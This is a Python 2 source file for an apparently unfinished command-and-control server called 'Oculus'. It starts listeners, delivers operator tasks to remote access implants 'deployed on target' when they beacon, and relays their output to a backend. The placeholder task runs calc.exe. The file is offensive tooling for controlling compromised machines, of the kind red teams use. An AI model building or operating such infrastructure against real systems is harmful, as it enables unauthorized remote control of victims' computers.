import BaseHTTPServer
import SimpleHTTPServer
import SocketServer
from subprocess import Popen, PIPE
import logging
import cgi
import ssl
import os
import re
import base64
import hashlib
import json
import requests
from datetime import *
from Crypto.Cipher import AES
from Crypto import Random
from multiprocessing import Process, Queue

import sqlite3

############
# WHAT THIS DOES
# Oculus instantiates listeners of a specified LISTENER_TYPE on given LPORT
# Underlying IMPLANT C2PROFILE handles communication management and translation
# Oculus handles communication with Emergence
# Emergence collections used => C2 || TASK
# Oculus recives TASK from Emergence and sends to implant via associated C2PROFILE
# Oculus recieves C2 from agent, handles via C2PROFILE, and sends to Emergence
# C2 & TASK JOIN ON ID (C2 and TASK share id fields across collections)
#
# DATA FLOW
# C2 Message => Data returned from agent => C2PROFILE handled/crypto/etc raw C2 output forwarded => Emergence stores agent output in C2 collection in MongoDB via /api/update
# Ops TASK => Operator tasking sent => Emergence stores command job in TASK collection in MongoDB | Oculus loads tasks from Emergence via /api/get request | Tasks delivered to agents upon beacon to LISTENER
#
#
# DEFINITIONS
#   - Implant       => Inactive Remote Access Tool (on the shelf)
#   - Agent         => Active Remote Access Tool (deployed on target and in use)
#   - eActions      => Actions registered to Emergence (capabilities)
#   - eTriggers     => Bound to signalling input types (new beacon, cmd recv, etc)
#   - eComponents   => Applications registered to Emergence (Oculus, Prism, Diagon)
##############


# PRIME OBJECTIVE => Get Gryffindor two-way C2 in & out of browser working
# 1. Oculus <=> Emergence
# 2. Gryffindor WSH <=> Oculus
# 3. Gryffindor REACT <=> Oculus
# 4. Gryffindor REACT <=> WSH

##############
# TODO
# 1. Get oculus running => Handler management server started PORT 127.0.0.1:29000
# 2. Oculus accepts JSON eAction to launch LISTENER
# 3. Oculus instantiates LISTENER of HTTP TYPE
# 4. Oculus recieves Gryffindor command data
##############


# FUTURE UPDATE: Read implants.json and load c2 profiles from all registered implants

from implants.gryffindor.c2profile import *
#from listeners.http import *

# FUTURE UPDATE: Manage data i/o with MongoDB and Emergence and Prism Shell
# from lib.dbmgr import *

# port to listen on for Oculus
# TODO: read this from program arguments
PORT = 29000

class OculusSvr:
   def oServer(self):
      print "Executing Oculus Control Server Thread"
      Handler = ServerHandler

      SocketServer.TCPServer.allow_reuse_address=True
      httpd = SocketServer.TCPServer(("", PORT), Handler)

      #httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', server_side=True)
      httpd.serve_forever()

   # /api/update || POST request with setting mod
   def Update(self, update):
      # Recieve JSON modification details
      # Check Action type
      action = update["action"]

      # if update["action"]["start_listener"]

      name = update["action"]["start_listener"]["name"]
      type = update["action"]["start_listener"]["type"]
      lport = update["action"]["start_listener"]["lport"]
      lhost = update["action"]["start_listener"]["lhost"]

      # FUTURE WORK: Get communication profile (Malleable c2)

      # Kick off listener
      if type == "http":
         print "1"
         CWD = os.getcwd()
         process = Popen(["python", os.path.join(CWD, "listeners/http.py"), name, type, lport, lhost], stdin=None, stdout=None, stderr=None)
         #stdout, stderr = process.communicate()


      response = "OK"
      return response

   def SyncTasks(self):
       taskrequest = {'collection':'TASK','agentid': '1'}

       TASKLIST = Emergence().Get(taskrequest)
       return TASKLIST

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def _set_headers(self):
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()

   # FUTURE WORK: Connect with Malleable C2
   def do_GET(self):
      # Get listener task request
      if self.path=='/api/c2':
         self._set_headers()

         # Determine time delta and SyncTasks
         newclock = datetime.utcnow()
         delta = newclock - BASECLOCK
         if delta.total_seconds() > 3:
             TASKLIST = OculusSvr().SyncTasks() # Probable a bug need to sync to self

         TASKLIST = OculusSvr().SyncTasks() # Probable a bug need to sync to self
         # Retrieve tasklist
         self.wfile.write(TASKLIST)

         return
      else:
         #print self.path
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

   def do_POST(self):
      # Get Oculus config actions (external api)
      # Commands => start_listener, stop_listener
      if self.path=='/api/update':
         self._set_headers()
         self.data_string = self.rfile.read(int(self.headers['Content-Length']))

         self.send_response(200)
         self.end_headers()

         update = json.loads(self.data_string)
         # print update["action"]["start_listener"]["type"]
         # update = json.dumps(data)

         self.wfile.write(OculusSvr().Update(update))

         return

      # Get raw listener c2
      elif self.path == '/api/c2':
          self._set_headers()
          self.data_string = self.rfile.read(int(self.headers['Content-Length']))
          Emergence().Update(self.data_string)

      else:
         #print self.path
         SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)


class Emergence:
   # /api/update || POST request to Emergence for MongoDB update
   def Update(self, apirequest):
      # Send JSON POST urllib or something
      eUpdate = json.loads(apirequest)

      requests.post('http://localhost:29001/api/update', data=eUpdate)
      return

   def Get(self, apirequest):
      # Send JSON POST urllib or something
      res = requests.post('http://localhost:29001/api/get', data=apirequest)
      data = res.text
      print data
      tasklist = json.dumps(data)
      #data = "retinfo"
      return data

# TODO: move this into a main function

# Start server
print "Starting..."

TASKLIST = '''{
"agentid": "1",
"taskid": "1",
"datetime": "now",
"cmd": "calc.exe"
}'''

BASECLOCK = datetime.utcnow()
Handler = ServerHandler

SocketServer.TCPServer.allow_reuse_address=True
httpd = SocketServer.TCPServer(("", PORT), Handler)

# SSL Disabled for now
#httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', server_side=True)
httpd.serve_forever()
